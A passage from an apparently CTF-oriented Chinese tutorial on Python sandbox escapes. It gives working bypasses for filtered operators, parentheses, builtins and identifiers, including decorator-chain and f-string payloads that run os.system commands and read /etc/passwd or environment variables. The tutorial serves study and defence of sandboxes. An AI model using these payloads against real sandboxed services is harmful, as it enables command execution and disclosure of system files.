<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 ** 0 == 1</span><br><span class="line">1 + 1 == 2</span><br><span class="line">2 + 1 == 3</span><br><span class="line">2 ** 2 == 4</span><br></pre></td></tr></table></figure></div>

<p>当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br></pre></td></tr></table></figure></div>

<p>第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 -&gt; len([])</span><br><span class="line">2 -&gt; len(list(dict(aa=()))[len([])])</span><br><span class="line">3 -&gt; len(list(dict(aaa=()))[len([])])</span><br></pre></td></tr></table></figure></div>

<p>第四种方法: unicode 会在后续的 unicode 绕过中介绍</p>
<h2 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h2><p>通过 ()、[] 替换</p>
<h2 id="过滤了运算符"><a href="#过滤了运算符" class="headerlink" title="过滤了运算符"></a>过滤了运算符</h2><h3 id="基础等价（值等价但无短路）"><a href="#基础等价（值等价但无短路）" class="headerlink" title="基础等价（值等价但无短路）"></a>基础等价（值等价但无短路）</h3><blockquote>
<p>Python里 <code>bool</code> 是 <code>int</code> 的子类：<code>True==1</code>, <code>False==0</code>。因此很多算术&#x2F;位运算都能“凑”出相同布尔结果，但<strong>两边都会被求值</strong>。</p>
</blockquote>
<ul>
<li><code>A or B</code><ul>
<li><code>A | B</code></li>
<li><code>A + B</code>（结果是 <code>0/1/2</code>；<code>bool(...)</code> 后才是布尔）</li>
<li><code>bool(A) or bool(B)</code> → 若 <code>or</code> 被禁，用 <code>bool(A) | bool(B)</code></li>
</ul>
</li>
<li><code>A and B</code><ul>
<li><code>A &amp; B</code></li>
<li><code>A * B</code>（0&#x2F;1；<code>bool(...)</code> 后等价）</li>
</ul>
</li>
<li><code>A xor B</code><ul>
<li><code>A ^ B</code></li>
</ul>
</li>
</ul>
<p>示例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a,b <span class="keyword">in</span> [(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">1</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>)]:</span><br><span class="line">    A,B = <span class="built_in">bool</span>(a), <span class="built_in">bool</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(A|B) == (A <span class="keyword">or</span> B), <span class="built_in">bool</span>(A*B) == (A <span class="keyword">and</span> B), <span class="built_in">bool</span>(A^B) == (A^B))</span><br></pre></td></tr></table></figure></div>

<p>⚠️ 注意：</p>
<ul>
<li><code>| &amp; ^ + *</code> <strong>没有短路</strong>；右侧表达式一定会执行（副作用会发生）。</li>
<li>对自定义对象，这些运算会调用 <code>__or__/__and__/__xor__/__add__</code> 等，可能<strong>不是布尔逻辑</strong>。</li>
</ul>
<h3 id="逻辑值“返回语义”复刻（短路值语义）"><a href="#逻辑值“返回语义”复刻（短路值语义）" class="headerlink" title="逻辑值“返回语义”复刻（短路值语义）"></a>逻辑值“返回语义”复刻（短路值语义）</h3><blockquote>
<p><code>or</code> 返回第一个真值或最后一个；<code>and</code> 返回第一个假值或最后一个。<br> 可以用“索引小技巧”在**不写 <code>or/and</code>**的情况下复刻其返回语义（且不需要三目）。</p>
</blockquote>
<ul>
<li><p><code>X or Y</code>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(X, Y)[<span class="number">1</span> - <span class="built_in">int</span>(<span class="built_in">bool</span>(X))]   <span class="comment"># X 真→取索引0→X；X 假→取索引1→Y</span></span><br></pre></td></tr></table></figure></div>

<p>如果不能写减法，换：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Y, X)[<span class="built_in">bool</span>(X)]            <span class="comment"># X 真→取索引1→X；X 假→取索引0→Y（次序调换一下）</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>X and Y</code>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(X, Y)[<span class="built_in">int</span>(<span class="built_in">bool</span>(X))]       <span class="comment"># X 真→取 Y；X 假→取 X</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>若 <strong>真的需要短路副作用</strong>（只在必要时求值），可以把右值包成 <code>lambda</code>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># X and f()  =&gt;  X 真时才调用 f</span></span><br><span class="line">(<span class="keyword">lambda</span>: X, <span class="keyword">lambda</span>: f())[<span class="built_in">int</span>(<span class="built_in">bool</span>(X))]()</span><br><span class="line"><span class="comment"># X or f()   =&gt;  X 假时才调用 f</span></span><br><span class="line">(<span class="keyword">lambda</span>: X, <span class="keyword">lambda</span>: f())[<span class="number">1</span> - <span class="built_in">int</span>(<span class="built_in">bool</span>(X))]()</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="“not”-的替代"><a href="#“not”-的替代" class="headerlink" title="“not” 的替代"></a>“not” 的替代</h3><p><code>not B</code>：</p>
<ul>
<li><code>1 - int(bool(B))</code></li>
<li><code>bool(B) ^ 1</code></li>
<li><code>(~bool(B)) &amp; 1</code>  （位取反再截断到 0&#x2F;1）</li>
</ul>
<h3 id="“-”-的替代"><a href="#“-”-的替代" class="headerlink" title="“&#x3D;&#x3D; &#x2F; !&#x3D;” 的替代"></a>“&#x3D;&#x3D; &#x2F; !&#x3D;” 的替代</h3><ul>
<li><code>x == y</code>：<ul>
<li><code>x in (y,)</code> &#x2F; <code>x in [y]</code> &#x2F; <code>&#123;y&#125;.__contains__(x)</code></li>
<li><code>not (x != y)</code> → 用上面的 <code>not</code> 替代方案</li>
<li>若允许比较运算：<code>(x &lt;= y) &amp; (y &lt;= x)</code>（对不可比较类型要小心异常）</li>
</ul>
</li>
<li><code>x != y</code>：<ul>
<li><code>x not in (y,)</code> 可能也被过滤；可用 <code>1 - int(x in (y,))</code></li>
</ul>
</li>
</ul>
<h3 id="组合逻辑的等价"><a href="#组合逻辑的等价" class="headerlink" title="组合逻辑的等价"></a>组合逻辑的等价</h3><ul>
<li><code>(A and B) or C</code>：<ul>
<li><code>bool(A&amp;B) | bool(C)</code></li>
</ul>
</li>
<li><code>A or (B and C)</code>：<ul>
<li><code>bool(A) | bool(B&amp;C)</code></li>
</ul>
</li>
</ul>
<blockquote>
<p>一定记得<strong>加括号</strong>，因为位运算优先级和逻辑运算不同：<br> <code>~</code> &gt; <code>**</code> &gt; <code>* / %</code> &gt; <code>+ -</code> &gt; <code>&lt;&lt; &gt;&gt;</code> &gt; <code>&amp;</code> &gt; <code>^</code> &gt; <code>|</code> &gt; 比较&#x2F;逻辑</p>
</blockquote>
<h3 id="内置函数替代"><a href="#内置函数替代" class="headerlink" title="内置函数替代"></a>内置函数替代</h3><p><code>map(func, iterable)</code> 的意思是：<strong>把 iterable（可迭代对象，比如列表）里的每个元素，依次交给 <code>func</code> 处理，并返回一个结果序列</strong>。</p>
<p>因此 <code>map(bool, [...])</code> 相当于将列表中的每个成员的值都转换为 <code>bool</code> 类型。之后借助 <code>any</code>&#x2F;<code>all</code> 实现逻辑运算。 </p>
<ul>
<li>多个 <code>or</code>：<code>any([A,B,C])</code> → 被过滤可用 <code>sum(map(bool, ...)) &gt; 0</code></li>
<li>多个 <code>and</code>：<code>all([A,B,C])</code> → 被过滤可用 <code>min(map(int, ...)) == 1</code></li>
</ul>
<h2 id="过滤了-3"><a href="#过滤了-3" class="headerlink" title="过滤了 ()"></a>过滤了 ()</h2><h3 id="利用装饰器"><a href="#利用装饰器" class="headerlink" title="利用装饰器 @"></a>利用装饰器 <code>@</code></h3><p>在 Python 中，装饰器是用 <code>@</code> 符号声明的，并且被用来修改类或函数的行为。一般来说，<strong>装饰器接受一个函数或类作为参数，做一些处理后返回一个新的函数或类。</strong></p>
<p>例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@D1</span></span><br><span class="line"><span class="meta">@D2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>这段代码的含义是：**<code>class A</code> 先被 <code>D2</code> 装饰器修饰，再被 <code>D1</code> 装饰器修饰**。也就是：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = D1(D2(A))</span><br></pre></td></tr></table></figure></div>

<p>例如我们可以利用下面这段代码在无 <code>()</code> 的情况下实现任意命令执行：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>运行过程是：</p>
<ol>
<li><strong>先创建类对象</strong><ul>
<li>解释器先执行 <code>class a: pass</code> 的类体，得到类对象 <code>&lt;class &#39;__main__.a&#39;&gt;</code>。</li>
</ul>
</li>
<li><strong>准备装饰器可调用</strong><ul>
<li>解析装饰器表达式，拿到两个可调用：<code>builtins.input</code> 和 <code>builtins.exec</code>。</li>
<li>注意：此时拿的是对象本身，并没有调用。</li>
</ul>
</li>
<li><strong>自下而上应用装饰器</strong><ul>
<li>规则：<code>@D1 @D2</code> 等价于 <code>a = D1(D2(a))</code>，所以先应用 <code>@input</code>，再应用 <code>@exec</code>。</li>
</ul>
</li>
<li><strong>应用 <code>@input</code>（最内层）</strong><ul>
<li>实际执行：<code>tmp = input(a)</code></li>
<li>这里 <code>input</code> 的<strong>提示串</strong>是 <code>str(a)</code>，也就是 <code>&quot;&lt;class &#39;__main__.a&#39;&gt;&quot;</code>，所以你看到提示。</li>
<li>你在提示后输入了一行：<code>__import__(&#39;os&#39;).system(&quot;id&quot;)</code></li>
<li>因而 <code>tmp</code> 现在是这个<strong>字符串</strong>：<code>&quot;__import__(&#39;os&#39;).system(\&quot;id\&quot;)&quot;</code></li>
</ul>
</li>
<li><strong>应用 <code>@exec</code>（外层）</strong><ul>
<li>实际执行：<code>result = exec(tmp)</code></li>
<li><code>exec</code> 会把上一步的字符串<strong>当作 Python 代码执行</strong>，于是运行了 <code>os.system(&quot;id&quot;)</code>，你看到 <code>uid=...</code> 的输出。</li>
</ul>
</li>
<li><strong>绑定回名字 <code>a</code></strong><ul>
<li>最终赋值：<code>a = result</code>，因为 <code>exec</code> <strong>没有返回值</strong>，因此 **<code>a</code> 被绑定为 <code>None</code>**（原本的类对象不再绑定在 <code>a</code> 上）。</li>
</ul>
</li>
</ol>
<p>同理我们还可以构造出任意地址读写的 payload：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@print</span></span><br><span class="line"><span class="meta">@set</span></span><br><span class="line"><span class="meta">@open</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>释器先执行 <code>class a: pass</code>，得到类对象 <code>&lt;class &#39;__main__.a&#39;&gt;</code>。</p>
</li>
<li><p>应用最内层装饰器 <code>@input </code>调用 <code>input(a)</code>，这会把类对象 <code>a</code> 转成字符串，作为 <code>input</code> 的提示符：<code>&lt;class &#39;__main__.a&#39;&gt;</code>。假设你输入：<code>/etc/passwd</code>，则 <code>input</code> 返回字符串 <code>&quot;/etc/passwd&quot;</code>。</p>
</li>
<li><p>应用 <code>@open</code>，调用 <code>open(&quot;/etc/passwd&quot;)</code> 以默认模式 <code>&#39;r&#39;</code> 打开文件，返回一个<strong>文件对象</strong>（可迭代，每次迭代是一行）。</p>
</li>
<li><p>应用 <code>@set</code>，调用 <code>set(&lt;file object&gt;)</code> 把文件对象迭代的所有行读出来，放进一个集合（去重、无序）。返回值是一个 <code>set</code>，内容是文件的所有行。</p>
<blockquote>
<p>Python 内置的 <code>set</code> 是一个<strong>可迭代对象的构造器</strong>，作用是从一个可迭代对象（iterable）构造一个<strong>集合</strong>类型（去重、无序）。</p>
<p>Python 里的<strong>文件对象</strong>（<code>_io.TextIOWrapper</code>）实现了迭代协议：</p>
<ul>
<li><p>它有 <code>__iter__</code> 方法，返回自己</p>
</li>
<li><p>它有 <code>__next__</code> 方法，每次 <code>next()</code> 返回文件中的下一行</p>
</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>): <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure></div>

<p>当你把文件对象传给 <code>set</code>，<code>set</code> 会遍历文件对象，把<strong>每一行</strong>（包含换行符）作为一个元素加入集合。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>)))</span><br></pre></td></tr></table></figure></div>
</blockquote>
</li>
<li><p>应用 <code>@print</code>，调用 <code>print(&lt;set of lines&gt;)</code> 会把集合内容打印到屏幕上。<code>print</code> **返回 <code>None</code>**。</p>
</li>
<li><p>最终 <code>a</code> 被赋值为 <code>None</code>（因为最外层装饰器 <code>print</code> 返回值是 <code>None</code>）。</p>
</li>
</ol>
<h3 id="利用魔术方法"><a href="#利用魔术方法" class="headerlink" title="利用魔术方法"></a>利用魔术方法</h3><p>例如 <code>enum.EnumMeta.__getitem__</code></p>
<h3 id="使用上下文管理器-with"><a href="#使用上下文管理器-with" class="headerlink" title="使用上下文管理器 with"></a>使用上下文管理器 <code>with</code></h3><p>当过滤 <code>()</code> 时我们需要考虑一些函数的隐式调用，即某些过程中可能会在内部把某个属性当做函数调用，然后设置这些函数即可。 </p>
<p>这里<strong>让 <code>help</code> 对象变成一个上下文管理器</strong>，并且 <code>help.__enter__()</code> 覆写成 <code>license()</code> 函数，然后使用 <code>with</code> 调用 <code>help.__enter__() → license()</code> 输出内容。</p>
<p><code>help</code> 本质是 <code>_sitebuiltins._Helper</code> 类的实例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="built_in">help</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>这个类默认不实现 <code>__enter__</code> 和 <code>__exit__</code> 方法，所以不能直接用 <code>with help:</code>。</p>
<blockquote>
<p><code>with</code> 是 <strong>上下文管理器（Context Manager）</strong> 语法，它的作用是：</p>
<ul>
<li>在代码块开始前做一些准备工作</li>
<li>在代码块结束后自动清理资源（不管有没有出错）</li>
</ul>
<p>上下文管理器必须实现两个方法：</p>
<ul>
<li><p><code>__enter__(self)</code> → 进入 <code>with</code> 代码块前调用，返回的值会赋给 <code>as</code> 后面的变量。</p>
</li>
<li><p><code>__exit__(self, exc_type, exc_val, exc_tb)</code> → 离开 <code>with</code> 代码块时调用，不管有没有异常都会执行。</p>
</li>
</ul>
</blockquote>
<p>但是我们可以把 <code>help</code> 魔改成上下文管理器：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br></pre></td></tr></table></figure></div>

<p>这里主要做了两件事：</p>
<ol>
<li>给 <code>help</code> 的类动态添加 <code>__enter__</code> 方法，指向刚才改过 <code>_Printer__filenames</code> 的 <code>license</code> 对象。这样 <code>with a:</code> 执行时，<code>__enter__</code> 会被调用 → 触发 <code>license()</code> → 读取文件。</li>
<li>给它加上 <code>__exit__</code> 方法（返回 <code>None</code> 就好），保证 <code>with</code> 语句能正常退出。</li>
</ol>
<p>之后用 <code>with</code> 触发读取：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> a: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p><code>a</code> 是 <code>help</code> 对象，<code>with</code> 语句会调用 <code>a.__enter__()</code> → 实际上是 <code>license()</code> → 打印 <code>/etc/passwd</code> 内容</p>
<p>完整代码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> a: <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<h2 id="f-字符串执行"><a href="#f-字符串执行" class="headerlink" title="f 字符串执行"></a>f 字符串执行</h2><p>f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如过去环境变量</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;whoami.__class__.__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].environ&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].path&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].modules&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access an element through several links</span></span><br><span class="line">&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;</span><br></pre></td></tr></table></figure></div>

<p>也可以直接 RCE</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">kali</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;<span class="subst">&#123;__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h2><h2 id="过滤了内建函数"><a href="#过滤了内建函数" class="headerlink" title="过滤了内建函数"></a>过滤了内建函数</h2><h3 id="eval-list-dict-构造"><a href="#eval-list-dict-构造" class="headerlink" title="eval + list + dict 构造"></a>eval + list + dict 构造</h3><p>假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;bool&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;st&#x27;</span>+<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数。如果某个模块已经被导入了，则也可以获取这个模块中的函数。</p>
<h2 id="过滤了-和-如何获取函数"><a href="#过滤了-和-如何获取函数" class="headerlink" title="过滤了 . 和 , 如何获取函数"></a>过滤了 <code>.</code> 和 <code>,</code> 如何获取函数</h2><p>通常情况下，我们会通过点号来进行调用<code>__import__(&#39;binascii&#39;).a2b_base64</code></p>
<p>或者通过 getattr 函数：<code>getattr(__import__(&#39;binascii&#39;),&#39;a2b_base64&#39;)</code></p>
<p>如果将 , 号和 . 都过滤了，则可以有如下的几种方式获取函数：</p>
<ul>
<li><p>内建函数可以使用<code>eval(list(dict(s_t_r=1))[0][::2])</code> 这样的方式获取。</p>
</li>
<li><p>模块内的函数可以先使用 <code>__import__</code> 导入函数，然后使用 <code>vars()</code> 进行获取：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">vars</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;binascii&#x27;</span>))[<span class="string">&#x27;a2b_base64&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function a2b_base64&gt;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="unicode-绕过"><a href="#unicode-绕过" class="headerlink" title="unicode 绕过"></a>unicode 绕过</h2><p>Python 3 开始支持非 ASCII 字符的标识符（PEP 3131），也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span> == 𝘦val</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<p>相似 unicode 寻找网站：<a class="link"   target="_blank" rel="noopener" href="http://shapecatcher.com/" >http://shapecatcher.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 可以通过绘制的方式寻找相似字符</p>
<p>下面是 0-9,a-z 的 unicode 字符</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</span><br><span class="line">𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 </span><br><span class="line">𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 </span><br></pre></td></tr></table></figure></div>

<p>下划线可以使用对应的全角字符进行替换：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＿</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Python 允许变量名里混合用<strong>普通的下划线 <code>_</code></strong> 和<strong>全角下划线 <code>＿</code>（U+FF3F）</strong>。但是<strong>变量名的第一个字符</strong>必须是<strong>字母（ASCII 或某些 Unicode 字母）</strong>或**普通的下划线 <code>_</code>**。如果第一个字符是全角下划线 <code>＿</code>，Python 会直接在解析阶段报 <code>SyntaxError</code>，因为它不认为 <code>＿</code> 符合“变量名开头的合法字符规则”。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_＿name_＿)</span><br><span class="line">__main__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid character <span class="string">&#x27;＿&#x27;</span> (U+FF3F)</span><br></pre></td></tr></table></figure></div>

<p>另外有些特殊的 Unicode 字符会在<strong>调用 <code>.lower()</code> 或 <code>.upper()</code></strong> 时自动变成其他字符。比如 Kelvin 符号 <code>K</code>（U+212A）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&quot;K&quot;</span>.lower())  <span class="comment"># 结果是 &#x27;k&#x27;</span></span><br><span class="line">k</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h1 id="绕过命名空间限制"><a href="#绕过命名空间限制" class="headerlink" title="绕过命名空间限制"></a>绕过命名空间限制</h1><h2 id="部分限制"><a href="#部分限制" class="headerlink" title="部分限制"></a>部分限制</h2><p>有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。</p>
